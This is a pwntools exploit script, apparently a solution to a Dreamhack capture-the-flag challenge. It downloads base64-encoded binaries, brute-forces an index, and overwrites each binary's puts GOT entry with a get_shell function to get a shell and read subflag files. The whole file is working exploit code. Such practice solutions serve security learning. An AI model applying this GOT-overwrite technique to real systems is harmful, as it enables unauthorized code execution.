import os
from pwn import *

p = remote("host1.dreamhack.games", 16078)
context.log_level = 'DEBUG'

p.sendlineafter('? ', 'y')

for i in range(20):
    file_name = './chall' + str(i)

    p.recvuntil("----------BINARY(base64encoded)----------\n")
    data = p.recvuntil('-')[:-1].decode("base64")
    print "hi: " + data
    a = open(file_name, "wb").write(data)
    os.system("chmod +x " + file_name)

    idx = 0
    while True:
        r = process(file_name)
        e = ELF(file_name)
    
        r.sendlineafter(': ', str(idx))
        r.sendlineafter(': ', p64(e.got['puts']))
        r.sendlineafter(': ', p64(e.sym['get_shell']))

        if not r.recvline(timeout=0.5):
            print('@' +  str(idx))
            r.close()
            break

        idx += 1

        r.close() 

    p.sendlineafter(': ', str(idx))
    p.sendlineafter(': ', p64(e.got['puts']))
    p.sendlineafter(': ', p64(e.sym['get_shell']))

    p.sendline("cat /tmp/subflag*")
    sub = p.recvuntil('}')
    p.sendline('exit')
    p.sendline('12313')
    p.sendlineafter(': ', sub)

p.interactive()
